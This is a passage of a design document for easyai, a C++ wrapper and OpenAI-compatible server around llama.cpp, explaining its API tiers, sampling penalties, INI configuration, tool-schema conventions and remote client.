# easyai — design

This document explains *why* easyai is shaped the way it is and how its
internal pieces fit together. It assumes you've at least skimmed the
[`README.md`](README.md).

---

## 0. Dependency inventory

Everything easyai pulls in, why, and where it lives:

| Dependency             | Required for                              | Source                                                                  | Linkage                                                  |
|------------------------|-------------------------------------------|-------------------------------------------------------------------------|----------------------------------------------------------|
| **llama.cpp `llama`**  | inference, model load, KV cache           | sibling checkout (`../llama.cpp/`)                                      | `libeasyai.so` `PRIVATE` link (BUILD_INTERFACE wrapped) |
| **llama.cpp `common`** | chat templates, tool-call parsing, sampler | sibling checkout (`../llama.cpp/common/`)                              | `libeasyai.so` `PRIVATE` link                            |
| **ggml + backends**    | tensor ops (CPU / Metal / Vulkan / CUDA / HIP) | transitively via `llama`                                            | resolved at runtime through `libllama.so`                |
| **cpp-httplib**        | server transport, **client transport**    | vendored by llama.cpp (`../llama.cpp/vendor/cpp-httplib/httplib.h`)     | static lib, linked into `easyai-server` and `libeasyai-cli` |
| **nlohmann::json**     | request/response JSON, tool args/results  | vendored by llama.cpp (`../llama.cpp/vendor/nlohmann/json.hpp`)         | header-only; included only where needed                  |
| **libcurl** (optional) | the unified `web` tool (action=`search` / `fetch`; `engine="auto"` default cascades google → brave → ddg-lite → bing → ddg, plus explicit `engine="google"` / `"brave"` / `"ddg-lite"` / `"bing"` / `"ddg"` overrides) | system package (`libcurl-dev`) | `libeasyai.so` `PRIVATE` when `EASYAI_WITH_CURL=ON`      |
| **OpenSSL** (optional) | future HTTPS for `easyai::Client`         | system package (`libssl-dev`)                                           | not yet linked — see [`include/easyai/client.hpp`](include/easyai/client.hpp) |
| **glslc / Vulkan SDK** | shader compilation when `GGML_VULKAN=ON`  | system package                                                          | build-time only, baked into `libggml-vulkan.so`         |
| **systemd-coredump**   | crash capture for the production server   | system package, declared by `scripts/install_easyai_server.sh`          | runtime, optional                                        |

**No header-leak guarantee** for the public ABI: `easyai/engine.hpp` only
forward-declares `common_chat_params`, `easyai/client.hpp` is
self-contained (no transitive llama.cpp / cpp-httplib / nlohmann include),
`easyai/tool.hpp` and `easyai/plan.hpp` use only standard library. Consumers
can link `libeasyai-cli` without touching llama.cpp at all.

---

## 1. Goals & non-goals

### Goals

1. **Make llama.cpp feel like an SDK.** A C++ developer should be able to
   load a GGUF file and start an agent loop in **three** lines (with
   `easyai::Agent`), or ten if they want full `Engine` control.  Either
   way: no `llama_*` C API knowledge, no `common_chat_msg` structure
   familiarity required.
2. **Tools are first-class and trivial to write.** Adding a tool should be
   ≤10 lines and require no JSON-schema knowledge.
3. **Be a credible OpenAI-compatible server.** Anything that posts to
   `POST /v1/chat/completions` should "just work", including clients that
   bring their own `system` prompt and `tools`.
4. **No surprises with memory.** Native resources are owned by RAII types,
   the HTTP server is bounded in payload size, and a single `std::mutex`
   serialises the engine.
5. **Layered ergonomics — easy by default, all-options reachable.**
   Beginners must see "wow, three lines and it works."  Experts must see
   "and I can still set CUDA layers, override KV cache type, register
   custom tools, hook tool callbacks."  Both have to work in the same
   library — no parallel codepaths, no Tier-1 sugar that locks you out
   of Tier-3 power.  That's the **four-tier API rule** (§1b below).

### Non-goals (for now)

* **Distributed inference** or batched multi-tenant serving — the engine is
  single-context, single-mutex.
* **Speculative decoding, RAG, embeddings** — all already in `llama.cpp`,
  but easyai stays out of their way to keep the surface small.

### What changed since the original v0 plan

* **Streaming is in.** The HTTP layer now mirrors `llama-server`'s
  incremental pipeline: every generated token is fed to
  `common_chat_parse(text, is_partial=true, parser_params)`,
  diffed against the previous parsed message via
  `common_chat_msg_diff::compute_diffs()`, and emitted as standard
  OpenAI-shape SSE deltas (`delta.reasoning_content` /
  `delta.content`).  Tool calls surface via the custom
  `easyai.tool_call` / `easyai.tool_result` SSE events plus an inline
  one-line markdown indicator so generic OpenAI clients still see
  *something* when a tool fires.
* **Webui is the llama-server SvelteKit bundle.** Embedded at build
  time via `cmake/xxd.cmake` (`webui/{index.html,bundle.js,
  bundle.css,loading.html}`).  We ship customisations as runtime
  patches: at-startup string substitutions on `bundle.js`, plus
  injected `<script>` blocks that scrub MCP/Sign-in chrome,
  shrink the bundle's native Reasoning panel, and drive a
  per-message status pill from the SSE stream.

---

## 1b. The four-tier API rule

Codified 2026-04-27 after the `easyai::Agent` extraction landed.
The library is intentionally layered into four tiers, each
implemented **on top of the next one down** — never as a parallel
codepath:

```
Tier 1: easyai::Agent                                  ← 3-line hello world
        └─ built on Tier 2/3
Tier 2: easyai::cli::Toolbelt, ui::Streaming, Agent setters
        ← fluent customisation
        └─ built on Tier 3
Tier 3: easyai::Engine, Client, Backend, Tool::builder
        ← explicit composables
        └─ built on Tier 4
Tier 4: raw llama.cpp handles, raw HTTP, custom Tool handlers
        ← escape hatches, never a wall
```

**Why every tier matters:**

- **Tier 1** sells the framework.  Three lines and it works:
  `Agent("model.gguf").ask("…")`.  If a beginner sees a 30-line
  setup, they leave.
- **Tier 2** keeps the obvious customisations obvious.  Want to
  enable file tools and shell?  `agent.sandbox(d).allow_bash()` —
  not a 5-step dance involving `Toolbelt`, `add_tool` calls, and
  `max_tool_hops` plumbing.
- **Tier 3** is where real applications live.  The example
  binaries (`easyai-local`, `easyai-cli`, `easyai-server`) sit
  here, not Tier 1, because they need fine-grained control over
  the agent loop, callbacks, and HTTP stream.
- **Tier 4** is the safety valve.  `agent.backend()` returns the
  underlying `Backend &`; `engine.raw_handle()` returns the
  llama.cpp pointer for anyone who needs to call a `llama_*`
  function we haven't wrapped yet.  Power users never hit a wall.

**Implementation discipline:**

1. Higher tiers are built on top of lower tiers.  `Agent` calls
   `Backend::chat()`; `Toolbelt::apply()` calls `Engine::add_tool()`.
   Never duplicate logic.
2. Lower tiers are always reachable from higher ones.  Every façade
   exposes the layer below it — `Agent::backend()`, `Backend::tools()`,
   etc.
3. Sensible defaults at every tier.  `Agent` registers `datetime` +
   the unified `web` tool by default; the unified `fs` tool and bash
   stay off until the user asks for them.  `Client::retry_on_incomplete` is on
   by default.  `Client::http_retries` is 5 by default (pre-stream
   transport failures retried with exponential backoff, logged on
   stderr without `--verbose`).  `Client::timeout_seconds` is 1800 s
   by default — generous for thinking models with long reasoning
   streams.  `max_tool_hops` is 8 by default but bumps to 99999
   when bash registers.
4. Honest documentation.  The bash tool's description in the model's
   tools list literally reads "NOT a hardened sandbox — runs with
   your user privileges."  No marketing.

The pattern is intentional: it lets us popularise hard topics (AI,
systems engineering) without compromising on power.

---

## 2. Why we build on top of `common/`, not just `include/llama.h`

llama.cpp ships two layers:

| layer       | header(s)                          | what's there                            |
|-------------|------------------------------------|-----------------------------------------|
| **core**    | `include/llama.h`, `ggml.h`        | model, context, sampling primitives.    |
| **common**  | `common/common.h`, `common/chat.h` | high-level helpers: `common_init_from_params`, Jinja chat templates, OpenAI-shape parsing, JSON-schema-to-grammar, PEG-based tool-call parser. |

Building tool-calling on the core layer alone would mean re-implementing
Jinja templating, the per-model tool-call grammar, and a JSON-schema parser.
That work already exists in `common/`, so we link against it.

The trade-off: `llama-common` is a moving target (it's a library only
internally). We pin our implementation to a sibling clone of `llama.cpp` and
update both together.

---

## 3. End-to-end data flow

```
┌────────────────┐     user msg      ┌──────────────────────────┐
│ caller (CLI/   │ ────────────────▶ │   Engine::chat(text)     │
│ HTTP / lib)    │                   └────────────┬─────────────┘
└────────────────┘                                │
                                                  ▼
              ┌─────────────────────────────────────────────────────┐
              │ render = common_chat_templates_apply(history+tools) │
              │   reasoning_format = AUTO (extract <think> blocks)  │
              └────────────────────────┬────────────────────────────┘
                                       ▼
              ┌─────────────────────────────────────────────────────┐
              │ tokenize, decode (Metal/Vulkan), sample loop         │
              │ (Engine::Impl::generate_until_done)                  │
              │   on_token() fires per piece — used by SSE layer     │
              └────────────────────────┬────────────────────────────┘
                                       ▼  raw assistant text
              ┌─────────────────────────────────────────────────────┐
              │ parse = common_chat_parse(raw, parser_arena)         │
              │   → common_chat_msg { content, reasoning_content,    │
              │                         tool_calls, ... }            │
              └────────────────────────┬────────────────────────────┘
                                       ▼
                       thought-only?  (content empty AND
                       tool_calls empty AND reasoning non-empty)
                          │
                          ├─ yes → discard turn, clear KV,
                          │        fire on_hop_reset, retry
                          │        (up to 2 retries; then fall
                          │        back to promoting reasoning
                          │        → content)
                          ▼
                              tool_calls.empty() ?
                                yes ──▶ return content
                                no  ──▶ for each call: dispatch + push
                                                         ┌─ tool result ─┐
                                                         ▼               │
                                                   loop back ────────────┘
                                                   (max 8 hops by default)
```

Two single-pass exits exist for the HTTP server:

* `Engine::generate_one()` — runs one render+decode+parse cycle, appends the
  result to history, and returns the parsed `GeneratedTurn` so the caller
  can inspect tool calls and *forward them to a remote client* without
  dispatching them locally.
* `Engine::push_message(role, content, tool_name, tool_call_id)` — append a
  message to the history without generating. Used by the HTTP server to
  rebuild the conversation per request and by client-side tool-result
  feeding.

A third entry point is used by streaming requests:

* `Engine::chat_continue()` — same multi-hop loop as `chat()` but assumes
  the user message is *already* the last entry in history. Required because
  the server pushes the user message first, then renders
  `chat_params_for_current_state()` to wire the parser, *then* calls into
  the engine. Splitting the entry points avoids the user message being
  pushed twice.

### The thought-only retry path

Some fine-tunes (notably custom Qwen3 trims) sometimes terminate the
turn after `</think>` without emitting either content or a tool_call.
To avoid surfacing an empty bubble to the user, `chat_continue()`
detects that condition and:

1. Throws away the empty turn (does NOT push it to history).
2. Clears the KV cache so the next iteration re-feeds the prompt clean.
3. Fires `on_hop_reset` so the streaming layer can drop its
   `accumulated` raw-text buffer and `prev_msg` diff baseline.
4. Loops back. Sampling is stochastic (`temp > 0`), so the second pass
   typically completes correctly.

A budget of 2 retries is hard-coded. If both pass-throughs are still
thought-only, the engine falls back to promoting `reasoning_content`
into `content` so the user sees the model's thinking instead of an
empty reply. The behaviour is logged when `Engine::verbose(true)`.

---

## 4. The `Engine` class

### Public surface (fluent)

```cpp
Engine().model("…").context(4096).gpu_layers(99)
        .system("…").temperature(0.2).top_p(0.92)
        .frequency_penalty(0.0).rope_scaling("none")
        .add_tool(…).on_token(…).load();
```

* All setters return `Engine &` so they chain.
* Setters are *staged* — they only modify the internal `common_params`
  struct; the model, context, and sampler are built when `.load()` is called.
* After `load()`, `set_sampling()` rebuilds the sampler in place. Other
  setters (model path, context size) require a fresh Engine.

### `Engine::Impl` (pimpl)

Holds the four llama.cpp resources and our extras:

```
common_params               params;          // mutated by setters
common_init_result_ptr      init;            // model + context (RAII)
common_chat_templates_ptr   templates;       // Jinja templates (RAII)
common_sampler            * sampler;         // freed in dtor
std::vector<common_chat_msg> history;        // conversation
std::vector<Tool>            tools;          // registered tools
TokenCallback               on_token;        // per-piece streaming hook
ToolCallback                on_tool;         // post-dispatch tool hook
HopResetCallback            on_hop_reset;    // fired when a hop is discarded
```

### KV-cache handling

We use `llama_memory_seq_pos_max(seq=0) + 1` as `n_past`. When we render the
prompt for a new turn, we tokenize the *full* current prompt and feed only
the suffix beyond `n_past` to `llama_decode`. This is the simplest correct
behaviour across all model architectures (recurrent / hybrid models can't
remove tokens from cache).

If `replace_history` is called we wipe the KV cache via
`llama_memory_clear(true)` so we never feed misaligned tokens.

---

## 4b. Sampling and the penalty stack

Every step of generation is a draw from a probability distribution
over the vocabulary.  Sampling is the set of knobs that *shape* that
distribution before the draw.  We expose three orthogonal layers:

| Layer | Purpose | Knobs |
|---|---|---|
| **Shapers** | Decide which tokens are *eligible* and how flat or peaked the distribution is. | `temperature`, `top_p`, `top_k`, `min_p` |
| **Penalties** | Bias *against* tokens the model has already produced, to prevent loops and topic-stickiness. | `repeat_penalty`, `frequency_penalty`, `presence_penalty` |
| **Presets** | Named bundles of shaper values that match a use-case (code, chat, brainstorming). | `precise / balanced / creative / …` |

Shapers and presets are well-understood llama.cpp territory; this
section focuses on the penalty layer because the three penalties
look superficially similar and pick-the-right-one mistakes are the
most common sampling-tuning bug we see in production.

### The three penalties — what they actually do

All three penalties live in the same struct
(`common_params_sampling`) and apply at the same point in the
sampler pipeline (after the shapers, before the draw).  The math is
what differs:

| Penalty | Form | Read as | llama.cpp field |
|---|---|---|---|
| `repeat_penalty` | **multiplicative** on the logit of any token in the recent window | "scale the log-probability of any previously-seen token by `1/p`" | `penalty_repeat` |
| `frequency_penalty` | **additive**, scaled by *how many times* the token has appeared | "subtract `p × count` from the logit" | `penalty_freq` |
| `presence_penalty` | **additive**, fixed per token that has appeared *at all* | "subtract `p` from the logit if the token has been seen — once or a hundred times, same cost" | `penalty_present` |

The three failure modes they each address:

* **`repeat_penalty`** — *literal token repetition* in a tight
  window.  The classic small-thinking-model loop: "I'll write
  types.h / Let me write types.h / OK, creating types.h" —
  identical tokens in adjacent positions.  Multiplicative form
  means the penalty *grows fast* once a token recurs: the second
  occurrence is mildly discouraged, the third is hammered.

* **`frequency_penalty`** — *over-use of common tokens* across the
  whole turn.  The "the the the" / "and and and" failure on weak
  models, or a model that keeps pronouning everything as "it".
  Linear in count, so cheap tokens accumulate cost gradually.

* **`presence_penalty`** — *topic stickiness*.  Once a concept
  appears, the model becomes likelier to keep referring to it
  (linguistically: anaphora; statistically: the KV cache primes
  related tokens).  A flat per-token cost on already-seen tokens
  pushes the model to introduce *new* vocabulary instead of
  rehearsing the same one — useful for keeping long agentic flows
  from collapsing into a single narrow topic.

### Why we added `presence_penalty` now

The original safety net was `repeat_penalty = 1.15` (mild
multiplicative) — catches tight rephrasing loops, leaves everything
else alone.  That worked well for short turns.

On *long agentic flows* (10+ tool hops, 50k+ tokens of
conversation history), `repeat_penalty=1.15` starts penalising the
wrong thing.  Examples we hit in production:

* The model has called `fs(action="read")` four times. On the fifth
  call, the literal tokens for the tool name are inside the
  recent-token window.  `repeat_penalty` discounts them.  The model
  substitutes a paraphrase — `read_file`, `read_fs`, `read` — which
  doesn't match any registered tool and causes an "unknown tool"
  failure.
* During a long planning section, the model has used the word
  "step" a dozen times.  `repeat_penalty` makes "step" expensive,
  so the model starts pronouning ("the next *one*", "the
  following *thing*"), which the user finds harder to read.

These are correct *behaviours* of `repeat_penalty` — its job is to
discourage repetition.  But for an agent that *should* keep emitting
`fs(action="read")` exactly the same way, repetition is feature, not
bug.  Multiplicative penalties also stack non-linearly: by hop 5+ the
third occurrence of a tool name is ~1.5× discouraged in raw logit
space, which is a lot.

`presence_penalty` is the lever for the *other* failure mode —
topic stickiness — without the per-occurrence ramp-up.  A fixed
1.5 cost per "this token has appeared at all" leaves the
quantitative shape of repetition unchanged: emitting
`fs(action="read")` for the tenth time is no more expensive than the
second.  But it does push the model to *introduce new content*
between tool calls instead of paraphrasing the prior turn.

The production tuning on the AI box settled on:

```
repeat_penalty   = 1.0      ; off — let the model repeat tool names literally
presence_penalty = 1.5      ; gentle pressure to introduce new content
```

This pairing tested better than `repeat_penalty=1.15` alone on
long agentic flows.  Operators with shorter chat workloads can
reverse it (`repeat_penalty=1.15`, `presence_penalty=0`) — the
trade-off is workload-shape-dependent, not absolute.

### How the penalty values reach the sampler

```
[ENGINE] presence_penalty = 1.5          (INI, generated by installer)
        │
        │  apply_ini_to_args()
        ▼
ServerArgs::presence_penalty = 1.5f
        │
        │  if (args.presence_penalty > -2.0f)        (sentinel guard)
        ▼
ctx->engine.presence_penalty(1.5f)
        │
        │  Engine::presence_penalty()
        ▼
params.sampling.penalty_present = 1.5f   (llama.cpp common_params_sampling)
        │
        │  load() → common_sampler_init()
        ▼
sampler chain applies the penalty before every token draw
```

The sentinel `-2.0f` ("not set") is shared with
`Client::presence_penalty()` in `libeasyai-cli` — `-2.0` is the
floor of the OpenAI-defined valid range, so picking it as
"untouched" loses a single legal point but matches the convention
used everywhere else.  Any value strictly greater than `-2.0`
wins.

### Per-request behaviour

`Engine::set_sampling(temp, top_p, top_k, min_p)` is called at
the **top of every request** to reset the *shapers* to ambient
defaults (or to per-request overrides from the chat-completions
JSON body).  Critically, `set_sampling()` does **not** touch
`penalty_repeat`, `penalty_freq`, or `penalty_present`.

That asymmetry is deliberate.  The shapers are *style* knobs —
clients legitimately want a creative-temperature one-off in the
middle of a precise-temp session, and OpenAI's request body has
fields for them.  The penalties are *guardrails* — once the
operator has tuned them for the model + workload, per-request
overrides would mostly be a footgun (a third-party prompt could
disable the anti-loop net by passing `repeat_penalty: 1.0`).
They stick at startup-set values.

If we ever need per-request penalty overrides (e.g. an OpenAI
client passing `presence_penalty: 0.5` in the body), the wiring is
a one-line addition to `set_sampling()` plus body-field parsing —
intentionally not done yet because no concrete need has surfaced.

### Where each knob lives in the layered API (cf. §1b)

| Layer | Surface | Knobs |
|---|---|---|
| **Tier 1** (`Agent`) | implicit — uses preset only | preset name, no penalty access |
| **Tier 2a** (`Engine`) | `Engine::repeat_penalty(float)`, `Engine::frequency_penalty(float)`, `Engine::presence_penalty(float)` | typed setters |
| **Tier 2b** (`Client`) | `Client::repeat_penalty / frequency_penalty / presence_penalty` | typed setters; written into the OpenAI request body |
| **Tier 3** (CLI / INI) | `--repeat-penalty F`, `--presence-penalty F`, `[ENGINE] repeat_penalty / frequency_penalty / presence_penalty` | one flag and one INI key per knob |
| **Tier 4** (raw HTTP) | request-body field `presence_penalty` etc. | currently honoured by the Client (outbound) but ignored by the server (inbound — see "Per-request behaviour" above) |

`frequency_penalty` is now exposed at Tier 2a as
`Engine::frequency_penalty(float)`.  Valid range is [0.0, 2.0];
default 0.0 (disabled).  Maps to `params.sampling.penalty_freq`.
The setter follows the same pattern as `presence_penalty` —
staged until `load()`, then modifiable via `set_sampling()`.
The INI key `[ENGINE] frequency_penalty` and per-model
`[MODEL_<pattern>] frequency_penalty` also wire through.

### Compute and context-extension knobs

Three additional Engine setters control how the model distributes
work across GPUs and how RoPE position encoding is scaled for
long-context inference:

| Setter | Values | Default | Maps to |
|---|---|---|---|
| `Engine::split_mode(const std::string & mode)` | `"none"` / `"layer"` / `"row"` / `"tensor"` | (llama.cpp default, typically `"layer"`) | `params.split_mode` enum |
| `Engine::rope_scaling(const std::string & type)` | `"none"` / `"linear"` / `"yarn"` | `"none"` (use model metadata) | `params.rope_scaling_type` enum |
| `Engine::rope_freq_scale(float scale)` | any float; 0.0 = default | 0.0 | `params.rope_freq_scale` |
| `Engine::yarn_orig_ctx(int ctx)` | any int; 0 = model default | 0 | `params.yarn_orig_ctx` |

**`split_mode`** controls how tensor work is partitioned across
multiple GPUs:

* `none` — single GPU, no split.
* `layer` — whole layers assigned to GPUs (classic pipeline
  parallelism; the default for most multi-GPU setups).
* `row` — individual rows of weight matrices split across GPUs.
* `tensor` — finer-grained tensor-level split.

Most operators never touch this — `layer` works well.  `row` and
`tensor` trade more inter-GPU traffic for better memory balance
when GPU VRAM sizes differ.

**`rope_scaling`** selects the positional-encoding extension
strategy for context lengths beyond the model's native training
window:

* `none` — no scaling; use whatever the model's GGUF metadata
  declares.
* `linear` — classic linear interpolation (Chen et al. 2023).
  Cheap, works for moderate extension ratios (2-4x).
* `yarn` — Yet Another RoPE extensioN (Peng et al. 2023).
  Better quality at high extension ratios (8-16x), slightly
  more compute.

`rope_freq_scale` is the frequency-domain scaling factor used by
both `linear` and `yarn`.  A value of 0.0 tells llama.cpp to use
the model's built-in default.  Typical values for a 4x extension
are around 0.25 (linear) or auto-computed (yarn).

`yarn_orig_ctx` sets the original context size that YaRN uses as
its reference window.  0 means "read from model metadata."  Only
meaningful when `rope_scaling = "yarn"`.

All four setters are staged (take effect at `load()`), follow the
same fluent `Engine &` return pattern, and are exposed as INI keys
under `[ENGINE]` and `[MODEL_<pattern>]`.

### Per-model INI profiles (`[MODEL_<pattern>]`)

The `easyai.ini` file supports per-model override sections that
let an operator tune sampling and compute knobs per model without
CLI flags:

```ini
[ENGINE]
temperature      = 0.2
ctx_size         = 262144

[MODEL_qwen3]
temperature      = 0.4
frequency_penalty = 0.05
rope_scaling     = yarn
yarn_orig_ctx    = 8192

[MODEL_llama-3]
repeat_penalty   = 1.1
split_mode       = row
```

**Matching rule:** the pattern in `[MODEL_<pattern>]` is compared
case-insensitively as a substring against the resolved model
filename (symlinks followed via `realpath`).  When multiple
sections match, the **longest pattern wins** — so `MODEL_qwen3-30b`
beats `MODEL_qwen3` for a file named `qwen3-30b-q4.gguf`.

**Supported keys** are the same set available under `[ENGINE]`:
`temperature`, `top_p`, `top_k`, `min_p`, `repeat_penalty`,
`frequency_penalty`, `presence_penalty`, `max_tokens`, `ctx_size`,
`ngl`, `split_mode`, `rope_scaling`, `rope_freq_scale`,
`yarn_orig_ctx`.

**Precedence (highest wins):**

1. CLI flags (`--temperature 0.3`)
2. Matching `[MODEL_<pattern>]` section
3. `[ENGINE]` section
4. Hardcoded defaults

This layering lets the operator set safe global defaults in
`[ENGINE]`, override per model family in `[MODEL_*]`, and still
override everything from the command line for a one-off run.

---

## 5. Tools & schema generation

A `Tool` is just:

```cpp
struct Tool {
    std::string name;
    std::string description;
    std::string parameters_json;   // JSON-schema (object)
    ToolHandler handler;           // std::function<ToolResult(const ToolCall&)>
};
```

The `Tool::Builder` pattern emits the JSON-schema for you so callers don't
need to know the schema spec:

```cpp
Tool::builder("read_file")
    .describe("Read a UTF-8 file")
    .param("path",   "string",  "Path to the file", true)
    .param("offset", "integer", "Skip this many bytes", false)
    .handle([](const ToolCall & c) { … })
    .build();
```

The generated schema is the minimal `{"type":"object","properties":{…},"required":[…]}`
that satisfies most chat-template tool-call grammars. Power users that want
nested objects, enums, or `$ref`s can call `Tool::make(name, desc, schema_json, handler)`
directly with their own schema string.

### Argument parsing helpers

Handlers receive the raw `arguments_json` from the model. The library
ships `easyai::args::get_string / get_int / get_double / get_bool` —
deliberately single-level scanners that don't pull a JSON dependency into
your handler code. For nested args, include `nlohmann/json.hpp` yourself
(it's vendored by llama.cpp).

The scanners are **deliberately lenient** about the shape they accept:
`get_string` reads a quoted integer as a string (`"42"` → `"42"`);
`get_int` accepts a numeric literal or a quoted one (`42` or `"42"`);
`get_array` accepts a real array *or* a stringified array (`"[1,2]"`).
This is the backstop for the smaller / quantised models that imitate the
shape they saw in the prompt instead of the one declared in the schema.
Use these helpers in every handler — don't roll your own JSON probe.

### Writing tool descriptions reliably

The model never sees your handler. It sees the tool's `name`,
`description`, and `parameters_json` — treat that text as the contract.
Vague or under-described tools produce malformed calls, the wrong action,
or silent loops where the model retries variants until the budget runs
out. Two patterns are used in-tree:

**Multi-action tools** (`plan`) dispatch on a top-level `action`
field. The description must enumerate every action and state, per action,
what is Required and what is Optional. The shape:

```
<one-sentence purpose>. Pick an action; the parameters needed depend
on which action you choose. N actions are supported:

  action="X"
    <what it does>. Required: A, B. Optional: C. Examples:
      {action:"X", A:"...", B:"..."}
      {action:"X", items:[{A:"..."}]}

  action="Y"
    ...
```

Per-property `description` strings in the schema lead with **which
actions consume them** — `"Used by add / update / delete. ..."`. Models
following the schema can map a parameter to the right action without
re-reading the body.

**Single-action tools** (`bash`, `datetime`, …) describe one
operation. The description should still cover:

* the operation (one sentence),
* Required vs. Optional parameters,
* the **output shape** (e.g. "one path per line, sorted, rooted at `/`"),
* one or two concrete example payloads,
* error / edge-case behavior (truncation, missing path, regex flavor, …).

Each `.param()` description leads with `Required` or `Optional`, then the
constraint and a default if any. The terse `"Search query"` form trains
the model to be terse back; the rich form
`"Required. ECMAScript regular expression. Each line is tested with
regex_search (substring match), so anchor with ^/$ if you want full-line
matches."` keeps it precise.

Models follow examples in the description more reliably than they parse
JSON-schema constraints. A description that *shows* a valid call is
worth ten that only describe the schema.

### Sandbox + tool defaults

Two flags control file/shell access:

* `--sandbox <dir>` — sets the working root for `fs` and `bash`.
* `--allow-bash` — registers the `bash` tool.

The unified `fs` tool auto-registers whenever **either** flag is set.
Bash subsumes `fs`, so requiring an extra `--allow-fs` flag for the
narrower surface was inverted from the threat model — and produced
sessions where the model had bash but no `fs`, trapping it into
`cat > file` / `sed -i` for ordinary file work. `--allow-fs` still
works (sets the working root to `.` if alone) but is redundant when
`--sandbox` or `--allow-bash` is already given.

The Toolbelt's `apply()` path also prepends three small in-binary
blocks to the user's system prompt when the agent has any
create/mutate affordance:

* `[tool-discipline]` — "your tools are EXACTLY what's in your
  schema; never invent tool names from training". Counters the
  most expensive failure mode we see: models calling
  `fs_write_file` / `bash` / `plan` / etc. when they aren't
  registered, earning `unknown tool` and wasting the turn.  When
  asked for a file/document with no write tool, the rule
  redirects the model to deliver content directly in the chat
  reply.  Same rule lives inside `build_builtin_system_prompt`
  on `easyai-server` and `easyai-local`, so the discipline
  reaches the model regardless of which surface the operator
  drives.
* `[environment]` — the absolute path of the sandbox root, so the
  model doesn't waste turn 1 on `fs(action="cwd")` / `pwd`.
* `[guidance]` — "pick one viable implementation and carry it through"
  assertiveness rule, so smaller models don't enumerate options or
  stop at a draft.

The unified `fs` tool's `cwd` and `sandbox` actions provide the same
information `get_current_dir` and `get_sandbox_path` used to as
standalone tools — `cwd` is the process's live working directory (can
drift), `sandbox` is the configured root pinned at registration.

### Closed-set rule + tools block: consolidated in libeasyai (2026-05-26)

The `[tool-discipline]` rule and the active-tools enumeration both
moved into libeasyai as `easyai::preamble::tools_block(view)`.
`easyai::preamble::build_builtin_system_prompt(view)` calls it
inline so server and local stay byte-identical without
hand-syncing two 180-line copies of the same prompt. `easyai-cli`
calls `tools_block(view)` directly from its prefix builder,
populating `view.active_tools` from a live `/v1/tools` fetch
against the configured server.

So the rule lives in **one** place in the source — multiple
emitters render it at the right boundary:

1. **`preamble::build_builtin_system_prompt(view)`** — the server
   and local binaries' wrapper builders just construct a
   `ToolsetView` from their argument structs and delegate.
2. **`easyai-cli` prefix injection** — calls `tools_block(view)`
   directly; the view's `active_tools` carries the server's
   actual catalogue so the bullet list isn't a guess.
3. **`scripts/install_easyai_server.sh` system.txt template** —
   the operator's take-over path retains a small inline copy of
   the closed-set rule so it stays present when the builtin
   prompt is replaced. (This is the one residual duplication;
   accepted because the installer template is operator-facing
   and benefits from being self-contained.)

Active-tools enumeration is sanitized at render time
(`sanitize_for_prompt(s, cap)` strips C0+DEL, length-caps name 64
chars / description 200 chars) so an untrusted `/v1/tools`
response cannot inject fake authoritative sections via embedded
newlines. See SECURITY_AUDIT §23.1.

### Tolerance shims — when the model goes off-spec anyway

A good description prevents most misfires; the rest are the cost of
running real models on tool calls. Mirror the lenient-parsing pattern at
the handler boundary:

* **Stringified containers.** Models occasionally emit
  `"items": "[{...}]"` (the array as a quoted JSON string) instead of
  `"items": [{...}]`. `args::get_array` already unwraps the string and
  re-parses; rely on it.
* **Missing required fields.** When the schema requires `action` but the
  model omits it, infer from the fields that *are* present rather than
  failing with `"missing 'action'"`. The pattern in `src/plan.cpp`:
  if `items` is present and the first item has `text`, intent is
  `add`; if it has `status`, intent is `update`; if it has only `id`,
  intent is `delete`. Resolve ambiguity using current state (e.g. does
  the id already exist in the plan?).
* **Synonyms.** Map near-miss verbs to canonical actions
  (`create` / `append` / `insert` → `add`, `remove` / `rm` → `delete`,
  `show` / `get` / `view` → `list`).
* **Errors that teach.** When you must reject a call, return an error
  whose body shows the correct shape inline:
  `plan: 'add' needs either text or items. Examples:
  {action:"add", text:"my step"} or
  {action:"add", items:[{text:"a"}, {text:"b"}]}.`
  The model gets a copy-fixable example for the next call instead of a
  cryptic hint.
* **Coalesce notifications across batches.** A handler that mutates
  shared state in a loop (e.g. plan items) should batch its `on_change`
  callbacks via an RAII guard so the UI re-renders once per call, not
  once per item — see `Plan::Batch` in `easyai/plan.hpp`.

These are not workarounds; they are the contract of the tool boundary.
The model is non-deterministic; the tool surface is deterministic. The
gap is bridged by a strict schema, a forgiving parser, and errors that
teach.

For per-tool cookbook examples — building one from scratch, multiple
parameters, tolerance shims walked through line-by-line — see
`manual.md` §3.2.1.

---

## 5b. The OpenAI-protocol client (`libeasyai-cli`)

`easyai::Client` is the network counterpart of `Engine`.  Same fluent
API, same `Tool` registration model, same agentic loop semantics — the
difference is that `chat()` POSTs to `/v1/chat/completions` and streams
the reply back over SSE instead of running llama.cpp locally.

```
                       libeasyai-cli                     remote server
   ┌────────────────────────────────────────────┐      ┌──────────────┐
   │  Client::chat("…")                          │      │  llama.cpp /  │
   │    POST /v1/chat/completions  (stream:true) │ ───▶ │  another      │
   │    body: { messages, tools, sampling… }     │      │  OpenAI-     │
   │                                             │      │  compat API  │
   │    SSE chunks  ◀─────────────────────────── │ ◀──  │              │
   │    parse delta.{content,reasoning,tool_calls}│      └──────────────┘
   │                                             │
   │    finish_reason == "tool_calls"?           │
   │      yes → dispatch handler() in-process,   │
   │            append tool message,             │
   │            POST again.                      │
   │      no  → return turn.content              │
   └────────────────────────────────────────────┘
```

Why a separate library:

* **Different deployment surface.**  `libeasyai` requires a model file,
  ggml, and the active GPU backend at link time.  `libeasyai-cli` only
  needs cpp-httplib + nlohmann::json + the `Tool`/`ToolCall`/`ToolResult`
  POD types it inherits from `libeasyai`.  Apps that just want to drive
  a remote endpoint don't pay the llama.cpp install cost.
* **Same authoring experience.**  A handler written for `Engine::add_tool`
  works unchanged with `Client::add_tool`.  This lets you prototype a
  tool against a tiny local model and then point the same code at the
  production cluster by swapping `Engine` → `Client`.
* **Server-management SDK.**  `Client` exposes one method per
  easyai-server endpoint (`list_models`, `list_remote_tools`, `health`,
  `metrics`, `props`, `set_preset`).  That makes the library enough to
  script and recreate a server's state from scratch.

The agentic loop in `Impl::run_chat_loop` mirrors
`Engine::chat_continue`: bounded at 8 hops, pushes the assistant
message into history *before* dispatching, captures tool failures as
`ERROR: …` content so the model can react to them, and returns
`turn.content` only when the model emits a non-tool `finish_reason`.

History is stored as raw OpenAI-shape JSON strings (one per message)
inside `Impl::history_json`, so no nlohmann::json type ever leaks
through the public ABI — `messages_array()` rebuilds the array on each
request.

The wire protocol is OpenAI's incremental-tool-call shape: tool calls
arrive across multiple deltas keyed by `index`, and `arguments` is a
